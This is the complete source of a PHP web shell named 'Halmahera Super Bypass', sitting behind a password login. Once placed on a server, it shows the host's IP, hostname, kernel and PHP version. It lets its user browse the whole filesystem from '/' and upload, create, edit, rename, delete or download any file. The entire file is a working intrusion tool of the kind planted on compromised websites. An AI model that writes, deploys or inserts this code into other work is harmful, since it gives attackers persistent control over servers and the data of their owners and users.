<?php
session_start();
date_default_timezone_set("Asia/Jakarta");
$hashed_password='$2y$10$3RvlLvqSRzrI4JHyv4uSAeMpWeIgnvMLFL9Kj7jHxOWw3ee7F13yy'; // bcrypt hash 'gantipassword'
$root_dir='/';
if(!isset($_SESSION['logged'])){
    if(isset($_POST['password'])&&password_verify($_POST['password'],$hashed_password)){
        $_SESSION['logged']=true;header("Location:?");exit;
    }
    echo '<form method="post" style="margin:100px auto;width:300px;"><h4>Halmahera Super Bypass</h4><input type="password" name="password" autofocus required style="width:100%;margin-bottom:10px;"><button type="submit">Login</button></form>';exit;
}
$path=isset($_GET['dir'])?realpath($_GET['dir']):getcwd();
if(!$path||strpos($path,$root_dir)!==0)$path=$root_dir;chdir($path);
$server_ip=gethostbyname(gethostname());
$server_hostname=gethostname();
$php_uname=php_uname();
$php_version=phpversion();
function perms($f){$p=@fileperms($f);if($p===false)return'---------';$t=is_dir($f)?'d':'-';$s=$t;foreach([0x0100,0x0080,0x0040,0x0020,0x0010,0x0008,0x0004,0x0002,0x0001]as$i)$s.=($p&$i)?'rwxrwxrwx'[$i%9]:'-';return $s;}
function fsize($f){if(!is_file($f))return'-';$s=filesize($f);$u=['B','KB','MB','GB','TB'];$i=0;while($s>=1024&&$i<4){$s/=1024;$i++;}return round($s,2).$u[$i];}
$msg='';
if(isset($_POST['create_folder'])){$n=basename($_POST['create_folder']);if($n&&@mkdir($path.'/'.$n))$msg="Folder created!";else $msg="Failed!";}
if(isset($_POST['create_file'])){$n=basename($_POST['create_file']);if($n&&@file_put_contents($path.'/'.$n,$_POST['file_content']))$msg="File created!";else $msg="Failed!";}
if(isset($_POST['rename'])&&isset($_GET['item'])){$n=basename($_POST['rename']);$o=$path.'/'.$_GET['item'];$ne=$path.'/'.$n;if(@rename($o,$ne))$msg="Renamed!";else $msg="Failed!";header("Location:?dir=".urlencode($path));exit;}
if(isset($_POST['edit'])&&isset($_GET['item'])){$f=$path.'/'.$_GET['item'];if(@file_put_contents($f,$_POST['edit']))$msg="Edited!";else $msg="Failed!";header("Location:?dir=".urlencode($path));exit;}
if(isset($_FILES['fileup'])){$f=$_FILES['fileup'];if(@move_uploaded_file($f['tmp_name'],$path.'/'.basename($f['name'])))$msg="File uploaded!";else $msg="Upload failed!";}
if(isset($_GET['delete'])){$t=$path.'/'.$_GET['delete'];if(is_file($t))@unlink($t);elseif(is_dir($t))@rmdir($t);header("Location:?dir=".urlencode($path));exit;}
if(isset($_GET['download'])){$f=$path.'/'.$_GET['download'];if(is_file($f)){header('Content-Type:application/octet-stream');header('Content-Disposition:attachment;filename="'.basename($f).'"');header('Content-Length:'.filesize($f));readfile($f);exit;}}
$files=@scandir($path);$dirs=[];$only_files=[];
foreach($files as $i){if($i=='.')continue;$full=$path.'/'.$i;if(is_dir($full))$dirs[]=$i;elseif(is_file($full))$only_files[]=$i;}
sort($dirs,SORT_NATURAL|SORT_FLAG_CASE);sort($only_files,SORT_NATURAL|SORT_FLAG_CASE);
echo "<div style='max-width:800px;margin:auto;padding:10px;'>";
echo "<b>Server IP:</b> $server_ip <small>($server_hostname)</small><br><b>PHP Uname:</b> $php_uname<br><b>PHP Version:</b> $php_version<br><hr>";
echo "<b>Path:</b> ";
$parts=explode('/',trim($path,'/'));$build='';echo '<a href="?dir=/">/</a>';foreach($parts as $i=>$p){if($p==='')continue;$build.='/'.$p;echo ' / <a href="?dir='.urlencode($build).'">'.htmlspecialchars($p).'</a>';}
echo "<hr>";
if($msg)echo "<div style='background:#eee;color:#333;padding:7px;margin-bottom:10px;'>$msg</div>";
if(isset($_GET['edit'])&&isset($_GET['item'])){$file=$path.'/'.$_GET['item'];if(is_file($file)){echo "<b>Edit: ".htmlspecialchars($_GET['item'])."</b><form method=post><textarea name=edit rows=10 style='width:100%;'>".htmlspecialchars(file_get_contents($file))."</textarea><button type=submit>Save</button></form><hr>";}}
if(isset($_GET['rename'])&&isset($_GET['item'])){echo "<b>Rename: ".htmlspecialchars($_GET['item'])."</b><form method=post><input name=rename value='".htmlspecialchars($_GET['item'])."' required><button type=submit>Rename</button></form><hr>";}
echo "<form method=post style='display:inline;'><input name='create_folder' placeholder='Folder' required><button type=submit>+Folder</button></form> ";
echo "<form method=post style='display:inline;'><input name='create_file' placeholder='File' required><input name='file_content' placeholder='Content'><button type=submit>+File</button></form> ";
echo "<form method=post enctype='multipart/form-data' style='display:inline;'><input type=file name=fileup required><button type=submit>Upload</button></form><br>";
echo "<table border=1 cellpadding=4 cellspacing=0 style='width:100%;margin-top:10px;font-size:14px;'><tr><th>Name</th><th>Type</th><th>Size</th><th>Perms</th><th>Actions</th></tr>";
if($path!=$root_dir){$parent=dirname($path);echo '<tr><td><a href="?dir='.urlencode($parent).'">&lt; ..</a></td><td>DIR</td><td>-</td><td>-</td><td>-</td></tr>';}
foreach($dirs as $i){$full=$path.'/'.$i;echo '<tr><td><a href="?dir='.urlencode($full).'"><b>'.htmlspecialchars($i).'</b></a></td><td>DIR</td><td>-</td><td>'.perms($full).'</td><td>';echo '<a href="?dir='.urlencode($path).'&rename=1&item='.urlencode($i).'">Rename</a> <a href="?dir='.urlencode($path).'&delete='.urlencode($i).'" onclick="return confirm(\'Delete?\')">Delete</a></td></tr>';}
foreach($only_files as $i){$full=$path.'/'.$i;echo '<tr><td>'.htmlspecialchars($i).'</td><td>FILE</td><td>'.fsize($full).'</td><td>'.perms($full).'</td><td>';echo '<a href="?dir='.urlencode($path).'&download='.urlencode($i).'">Download</a> <a href="?dir='.urlencode($path).'&edit=1&item='.urlencode($i).'">Edit</a> <a href="?dir='.urlencode($path).'&rename=1&item='.urlencode($i).'">Rename</a> <a href="?dir='.urlencode($path).'&delete='.urlencode($i).'" onclick="return confirm(\'Delete?\')">Delete</a></td></tr>';}
echo "</table></div>";
?>
